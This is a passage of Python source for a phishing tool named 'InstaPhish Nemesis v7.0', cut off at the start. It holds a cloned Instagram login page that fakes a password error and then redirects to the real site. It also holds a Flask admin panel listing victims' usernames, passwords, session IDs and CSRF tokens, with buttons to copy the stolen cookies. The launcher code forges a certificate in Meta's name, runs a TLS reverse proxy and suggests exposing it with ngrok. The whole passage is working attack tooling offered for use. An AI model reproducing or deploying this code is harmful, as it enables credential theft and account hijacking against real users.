<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#fafafa">
<title>Instagram</title>
<link rel="stylesheet" href="/css/style.css">
<link rel="icon" href="/images/insta_logo.png">
</head>
<body>
<div class="container">
<div class="phone-col">
<div class="slideshow">
<div class="slide active" style="background-image:url('/images/ss1.png')"></div>
<div class="slide" style="background-image:url('/images/ss2.png')"></div>
<div class="slide" style="background-image:url('/images/ss3.png')"></div>
</div>
<img class="phone-frame" src="/images/phones.png" alt="">
</div>
<div class="login-col">
<div class="login-box">
<img class="insta-logo" src="/images/title.jpg" alt="Instagram">
<form id="loginForm" method="POST" action="/accounts/login/ajax/" autocomplete="on">
<input class="form-input" type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username" autocorrect="off" autocapitalize="off">
<input class="form-input" type="password" name="enc_password" placeholder="Password" required autocomplete="current-password">
<button type="submit" class="login-btn">Log in</button>
</form>
<div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
<div class="divider">OR</div>
<div class="fb-login">
<img class="fb-icon" src="/images/facebook.png" alt="">
<a class="fb-link" href="/accounts/login/?next=%2F">Log in with Facebook</a>
</div>
<a class="forgot-link" href="/accounts/password/reset/">Forgot password?</a>
</div>
<div class="signup-box">Don't have an account? <a href="/accounts/emailsignup/">Sign up</a></div>
<div class="app-section">
<span>Get the app.</span>
<div class="app-btns">
<a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="/images/google-play.png" alt="Google Play"></a>
<a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT"><img src="/images/microsoft.png" alt="Microsoft"></a>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-links">
<a href="https://about.meta.com/">Meta</a><a href="https://about.instagram.com/">About</a><a href="https://about.instagram.com/blog/">Blog</a><a href="https://about.instagram.com/about-us/jobs">Jobs</a><a href="https://help.instagram.com/">Help</a><a href="https://developers.facebook.com/docs/instagram">API</a><a href="https://help.instagram.com/519522125107875">Privacy</a><a href="https://help.instagram.com/581066165581870">Terms</a><a href="https://www.instagram.com/explore/locations/">Locations</a><a href="https://www.instagram.com/instagram_lite/">Instagram Lite</a><a href="https://www.threads.net/">Threads</a><a href="https://www.facebook.com/help/instagram/2617046393526281">Contact Uploading</a><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
</div>
<div class="copyright">&copy; 2024 Instagram from Meta</div>
</footer>
<script>
(function(){var s=document.querySelectorAll('.slide');var c=0;setInterval(function(){s[c].classList.remove('active');c=(c+1)%s.length;s[c].classList.add('active')},4500)})();
document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();document.getElementById('errorMsg').classList.add('show');setTimeout(function(){window.location.href='https://www.instagram.com/accounts/login/'},2000)});
</script>
</body>
</html>'''

# ===================================================================================
# ADMIN PANEL
# ===================================================================================

class AdminPanel:
    """Flask-based admin panel"""
    
    def __init__(self):
        self._generate_html()
    
    def _generate_html(self):
        html = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InstaPhish v7.0 - Command Center</title>
<style>
:root{--bg:#0a0a0a;--card:#121212;--border:#262626;--text:#f5f5f5;--text2:#a8a8a8;--accent:#0095f6;--accent2:#1877f2;--danger:#ed4956;--success:#78de45;--warn:#f7b500;--purple:#8b5cf6}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:20px;min-height:100vh}
.header{background:linear-gradient(135deg,var(--card),#1a1a1a);border:1px solid var(--border);padding:24px;border-radius:16px;margin-bottom:24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;box-shadow:0 4px 20px rgba(0,0,0,.3)}
.header h1{font-size:24px;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.live-dot{display:inline-block;width:10px;height:10px;background:var(--success);border-radius:50%;margin-right:8px;animation:pulse 1.5s infinite;box-shadow:0 0 10px var(--success)}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(1.3)}}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;text-align:center;transition:.3s}
.stat-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,149,246,.15)}
.stat-value{font-size:32px;font-weight:800;color:var(--accent)}
.stat-label{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-top:4px;font-weight:600}
.panel{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:24px}
.panel-header{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;background:rgba(255,255,255,.02)}
.panel-header h2{font-size:15px;font-weight:600}
table{width:100%;border-collapse:collapse}
th{background:rgba(255,255,255,.03);padding:12px 16px;text-align:left;font-size:11px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border);white-space:nowrap}
td{padding:10px 16px;border-bottom:1px solid var(--border);font-size:13px}
tr:hover{background:rgba(0,149,246,.04)}
.cookie-cell{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace;font-size:11px;cursor:pointer;color:var(--warn)}
.cookie-cell:hover{text-decoration:underline}
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border:none;border-radius:8px;cursor:pointer;font-size:12px;font-weight:600;transition:.2s}
.btn-primary{background:var(--accent);color:#fff}.btn-primary:hover{background:var(--accent2)}
.btn-success{background:rgba(120,222,69,.2);color:var(--success);border:1px solid rgba(120,222,69,.3)}.btn-success:hover{background:rgba(120,222,69,.3)}
.btn-danger{background:rgba(237,73,86,.2);color:var(--danger);border:1px solid rgba(237,73,86,.3)}.btn-danger:hover{background:rgba(237,73,86,.3)}
.btn-copy{background:rgba(139,92,246,.2);color:var(--purple);border:1px solid rgba(139,92,246,.3)}.btn-copy:hover{background:rgba(139,92,246,.3)}
.btn-sm{padding:4px 10px;font-size:11px;border-radius:6px}
.btn-group{display:flex;gap:4px;flex-wrap:wrap}
.badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:10px;font-weight:600;text-transform:uppercase}
.badge-success{background:rgba(120,222,69,.15);color:var(--success)}
.badge-warning{background:rgba(247,181,0,.15);color:var(--warn)}
.badge-proxy{background:rgba(139,92,246,.15);color:var(--purple)}
.search-bar{background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--text);padding:8px 14px;border-radius:8px;font-size:13px;width:250px;outline:none}.search-bar:focus{border-color:var(--accent)}
.empty-state{text-align:center;padding:48px;color:var(--text2)}
.toast{position:fixed;bottom:24px;right:24px;background:var(--card);border:1px solid var(--border);padding:16px 20px;border-radius:12px;color:var(--text);z-index:1000;animation:slideIn .3s;box-shadow:0 8px 30px rgba(0,0,0,.5)}
@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
@media(max-width:768px){body{padding:10px}.stats-grid{grid-template-columns:repeat(2,1fr)}th,td{padding:8px 10px;font-size:11px}.search-bar{width:100%}}
</style>
</head>
<body>
<div class="header">
<div><h1><span class="live-dot"></span>InstaPhish Command Center</h1><p style="color:var(--text2);font-size:12px;margin-top:4px">Nemesis Reverse Proxy v7.0</p></div>
<div><button class="btn btn-primary" onclick="r()">🔄 Refresh</button><button class="btn btn-danger btn-sm" onclick="c()" style="margin-left:8px">🗑 Clear</button></div>
</div>
<div class="stats-grid">
<div class="stat-card"><div class="stat-value" id="t">0</div><div class="stat-label">Total</div></div>
<div class="stat-card"><div class="stat-value" id="td">0</div><div class="stat-label">Today</div></div>
<div class="stat-card"><div class="stat-value" id="wc">0</div><div class="stat-label">With Cookies</div></div>
<div class="stat-card"><div class="stat-value" id="as">0</div><div class="stat-label">Active Sessions</div></div>
<div class="stat-card"><div class="stat-value" id="lh">0</div><div class="stat-label">Last Hour</div></div>
<div class="stat-card"><div class="stat-value" id="uip">0</div><div class="stat-label">Unique IPs</div></div>
</div>
<div class="panel">
<div class="panel-header"><h2>🔓 Captured Data</h2><input type="text" class="search-bar" placeholder="🔍 Search..." onkeyup="f(this.value)"></div>
<div style="overflow-x:auto"><table><thead><tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>Session ID</th><th>CSRF</th><th>Method</th><th>Actions</th></tr></thead><tbody id="vt"></tbody></table></div>
</div>
<div class="panel">
<div class="panel-header"><h2>🍪 Active Sessions</h2></div>
<div style="overflow-x:auto"><table><thead><tr><th>Captured</th><th>Session ID</th><th>CSRF</th><th>User ID</th><th>Status</th><th>Actions</th></tr></thead><tbody id="st"></tbody></table></div>
</div>
<script>
var pc=0;
async function r(){try{var d=await(await fetch('/api/data')).json();document.getElementById('t').textContent=d.s.total||0;document.getElementById('td').textContent=d.s.today||0;document.getElementById('wc').textContent=d.s.with_cookies||0;document.getElementById('as').textContent=d.s.active_sessions||0;document.getElementById('lh').textContent=d.s.last_hour||0;document.getElementById('uip').textContent=d.s.unique_ips||0;var vt=document.getElementById('vt');if(!d.v||d.v.length===0){vt.innerHTML='<tr><td colspan="8"><div class="empty-state">Waiting for targets...</div></td></tr>'}else{if(d.v.length>pc&&pc>0){n(d.v.length-pc+' new!')}pc=d.v.length;var h='';d.v.forEach(function(v,i){var m=v.capture_method||'proxy';var bc=m.includes('cookie')?'badge-warning':m.includes('proxy')?'badge-proxy':'badge-success';h+='<tr><td style="white-space:nowrap;font-size:11px">'+(v.timestamp||'-')+'</td><td style="font-family:monospace;font-size:12px">'+(v.ip_address||v.ip||'-')+'</td><td><strong>'+(v.username||'-')+'</strong></td><td style="color:var(--warn)">'+(v.password||'-')+'</td><td class="cookie-cell" title="'+(v.sessionid||'')+'" onclick="cp(\''+(v.sessionid||'')+'\')">'+(v.sessionid?v.sessionid.substring(0,25)+'...':'-')+'</td><td class="cookie-cell" title="'+(v.csrftoken||'')+'" onclick="cp(\''+(v.csrftoken||'')+'\')">'+(v.csrftoken?v.csrftoken.substring(0,20)+'...':'-')+'</td><td><span class="badge '+bc+'">'+m+'</span></td><td><div class="btn-group"><button class="btn btn-copy btn-sm" onclick="cc('+v.id+')">📋</button><button class="btn btn-danger btn-sm" onclick="dl('+v.id+')">🗑</button></div></td></tr>'});vt.innerHTML=h}var st=document.getElementById('st');if(!d.ss||d.ss.length===0){st.innerHTML='<tr><td colspan="6"><div class="empty-state">No active sessions</div></td></tr>'}else{var sh='';d.ss.forEach(function(s){sh+='<tr><td>'+(s.captured_at||'-')+'</td><td class="cookie-cell" title="'+(s.sessionid||'')+'" onclick="cp(\''+(s.sessionid||'')+'\')">'+(s.sessionid?s.sessionid.substring(0,30)+'...':'-')+'</td><td class="cookie-cell" title="'+(s.csrftoken||'')+'" onclick="cp(\''+(s.csrftoken||'')+'\')">'+(s.csrftoken?s.csrftoken.substring(0,20)+'...':'-')+'</td><td>'+(s.ds_user_id||'-')+'</td><td><span class="badge badge-success">Active</span></td><td><button class="btn btn-copy btn-sm" onclick="cs('+s.id+')">📋</button></td></tr>'});st.innerHTML=sh}}catch(e){console.error(e)}}
function f(q){document.querySelectorAll('#vt tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q.toLowerCase())?'':'none'})}
function cp(t){if(!t||t==='-')return;navigator.clipboard.writeText(t).then(function(){n('Copied!')}).catch(function(){var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);n('Copied!')})}
async function cc(id){try{var d=await(await fetch('/api/cookies/'+id)).json();if(d.cookies){cp(d.cookies);n('Full cookies copied!')}else{n('No cookies')}}catch(e){}}
async function cs(id){try{var d=await(await fetch('/api/session/'+id)).json();if(d.cookies){cp(d.cookies);n('Session copied!')}}catch(e){}}
async function dl(id){if(confirm('Delete?')){await fetch('/api/delete/'+id);r()}}
async function c(){if(confirm('Delete ALL?')){await fetch('/api/clear-all');pc=0;r()}}
function n(m){var t=document.createElement('div');t.className='toast';t.textContent=m;document.body.appendChild(t);setTimeout(function(){t.remove()},3000)}
r();setInterval(r,3000);
</script>
</body>
</html>'''
        with open('admin.html','w') as f:
            f.write(html)
    
    def start(self):
        try:from flask import Flask,jsonify
        except ImportError:logger.error('Flask required: pip install flask');return
        app=Flask(__name__)
        db=DatabaseManager()
        @app.route('/')
        def index():
            try:return open('admin.html').read()
            except:return 'Admin panel not found',500
        @app.route('/api/data')
        def data():
            return jsonify({'s':db.get_stats(),'v':db.get_victims(200),'ss':db.get_active_sessions(100)})
        @app.route('/api/cookies/<int:vid>')
        def cookies(vid):
            for v in db.get_victims(1):return jsonify({'cookies':v.get('all_cookies','')})
            return jsonify({'cookies':''})
        @app.route('/api/session/<int:sid>')
        def session(sid):
            for s in db.get_active_sessions(200):
                if s.get('id')==sid:return jsonify({'cookies':s.get('all_cookies','')})
            return jsonify({'cookies':''})
        @app.route('/api/delete/<int:vid>')
        def delete(vid):db.delete_victim(vid);return jsonify({'ok':True})
        @app.route('/api/clear-all')
        def clear():db.clear_all();return jsonify({'ok':True})
        logger.success(f'Admin panel: http://0.0.0.0:{CONFIG.ADMIN_PORT}')
        app.run(host='0.0.0.0',port=CONFIG.ADMIN_PORT,debug=False,use_reloader=False)

# ===================================================================================
# MAIN APPLICATION
# ===================================================================================

class InstaPhishFramework:
    """Main application controller"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.builder = ClonedSiteBuilder()
        self.admin = AdminPanel()
        self._setup_signal_handlers()
    
    def _setup_signal_handlers(self):
        """Setup graceful shutdown"""
        signal.signal(signal.SIGINT, self._graceful_shutdown)
        signal.signal(signal.SIGTERM, self._graceful_shutdown)
        atexit.register(self._cleanup)
    
    def _graceful_shutdown(self, signum, frame):
        logger.warning("\nShutting down...")
        self._cleanup()
        sys.exit(0)
    
    def _cleanup(self):
        """Cleanup resources"""
        try:
            self.db.backup()
            logger.success("Database backed up")
        except:
            pass
    
    def setup(self):
        """Initial setup"""
        logger.info("Initializing InstaPhish Nemesis v7.0...")
        
        # Create directories
        dirs = ['certs','logs','cloned_site/css','cloned_site/js','cloned_site/images',
                'sessions','backups','traffic_dumps','lures']
        for d in dirs:
            os.makedirs(d, exist_ok=True)
        
        # Generate SSL certificate
        if not os.path.exists(CONFIG.SSL_CERT):
            subprocess.run(['openssl','req','-x509','-newkey','rsa:4096','-sha256',
                          '-days','3650','-nodes','-keyout',CONFIG.SSL_KEY,
                          '-out',CONFIG.SSL_CERT,
                          '-subj','/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com',
                          '-addext','subjectAltName=DNS:*.instagram.com,DNS:instagram.com,DNS:www.instagram.com,DNS:*.cdninstagram.com',
                          '-addext','basicConstraints=CA:FALSE'],
                          capture_output=True)
        
        # Build clone
        self.builder.build()
        
        # Check images
        required = ['facebook.png','google-play.png','insta_logo.png','microsoft.png',
                   'phones.png','ss1.png','ss2.png','ss3.png','title.jpg']
        missing = [i for i in required if not os.path.exists(f'cloned_site/images/{i}')]
        if missing:
            logger.warning(f"Missing images: {missing}")
            logger.warning("Copy images to cloned_site/images/")
        
        logger.success("Setup complete!")
    
    def start(self):
        """Start the framework"""
        # Start admin panel
        threading.Thread(target=self.admin.start, daemon=True).start()
        time.sleep(1.5)
        
        # Start proxy server
        server = socketserver.ThreadingTCPServer(
            (CONFIG.LISTEN_HOST, CONFIG.LISTEN_PORT),
            ProxyRequestHandler
        )
        
        # SSL
        if os.path.exists(CONFIG.SSL_CERT) and os.path.exists(CONFIG.SSL_KEY):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(CONFIG.SSL_CERT, CONFIG.SSL_KEY)
            ctx.set_ciphers(CONFIG.SSL_CIPHERS)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
        
        print(f"""
{AnsiColors.BG_GREEN}{AnsiColors.BLACK} NEMESIS v7.0 ACTIVE {AnsiColors.RESET}
{AnsiColors.GREEN}├─ Phishing: https://0.0.0.0:{CONFIG.LISTEN_PORT}{AnsiColors.RESET}
{AnsiColors.GREEN}├─ Admin:    http://0.0.0.0:{CONFIG.ADMIN_PORT}{AnsiColors.RESET}
{AnsiColors.GREEN}├─ Logs:     logs/{AnsiColors.RESET}
{AnsiColors.GREEN}└─ Cookies:  logs/cookies.txt{AnsiColors.RESET}
{AnsiColors.YELLOW}Expose: ngrok http {CONFIG.LISTEN_PORT}{AnsiColors.RESET}
{AnsiColors.RED}Ctrl+C to stop{AnsiColors.RESET}
""")
        
        server.serve_forever()

def main():
    Banner.display_startup()
    app = InstaPhishFramework()
    app.setup()
    app.start()

if __name__ == '__main__':
    main()
